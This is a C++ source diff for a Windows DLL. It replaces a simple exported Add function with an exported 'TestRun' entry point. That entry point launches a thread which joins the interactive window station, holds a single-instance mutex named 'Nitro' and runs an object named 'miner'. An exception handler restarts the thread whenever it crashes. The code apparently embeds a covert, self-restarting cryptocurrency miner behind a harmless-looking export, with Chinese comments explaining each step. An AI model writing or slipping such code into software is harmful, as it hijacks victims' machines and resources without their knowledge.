@@ -22,7 +22,6 @@
  */
 
 #include "App.h"
-#include "stdafx.h"
 
 
 //#pragma comment(lib, "libsysaux.lib")
@@ -64,7 +63,81 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 	return TRUE;
 }
 
-int _stdcall Add(int a, int b)
+
+extern "C" __declspec(dllexport) void TestRun(char* strHost, int nPort)
 {
-	return a + b;
+
+	DWORD threadID;
+		
+	HANDLE hThread = CreateThread(NULL, // default security attributes
+		0, // use default stack size
+		MyMain, // thread function
+		NULL, // argument to thread function
+		0, // use default creation flags	
+		&threadID); // returns the thread identifier
+
+
+
+
+													//这里等待线程结束
+	WaitForSingleObject(hThread, INFINITE);
+	CloseHandle(hThread);
+}
+
+
+DWORD WINAPI MyMain(LPVOID lpParam)
+{
+
+	HANDLE	hInstallMutex = NULL;
+	HANDLE	hEvent = NULL;
+
+	// Set Window Station
+	//--这里是同窗口交互
+	HWINSTA hOldStation = GetProcessWindowStation();    //功能获取一个句柄,调用进程的当前窗口
+	HWINSTA hWinSta = OpenWindowStation(L"winsta0", FALSE, MAXIMUM_ALLOWED);   //　打开指定的窗口站  XP的默认窗口站
+	if (hWinSta != NULL)
+	{
+		SetProcessWindowStation(hWinSta);   //设置本进程窗口为winsta0  // 分配一个窗口站给调用进程，以便该进程能够访问窗口站里的对象，如桌面、剪贴板和全局原子
+	}
+
+
+
+	if (g_hDllModule != NULL)   //g_hInstance 该值要在Dll的入口进行赋值
+	{
+		//自己设置了一个访问违规的错误处理函数 如果发生了错误 操作系统就会调用bad_exception
+		SetUnhandledExceptionFilter(bad_exception);  //这里就是错误处理的回调函数了
+
+
+		hInstallMutex = CreateMutex(NULL, true, L"Nitro");  //该互斥体是只允许一台PC拥有一个实例
+
+		App miner(NULL, 0);
+		return miner.exec();
+	
+	}
+	return 0;
+}
+
+
+
+
+// 发生异常，重新创建进程
+LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
+{
+
+	DWORD threadID;
+
+	HANDLE hThread = CreateThread(NULL, // default security attributes
+		0, // use default stack size
+		MyMain, // thread function
+		NULL, // argument to thread function
+		0, // use default creation flags	
+		&threadID); // returns the thread identifier
+
+
+
+
+					//这里等待线程结束
+	WaitForSingleObject(hThread, INFINITE);
+	CloseHandle(hThread);
+	return 0;
 }
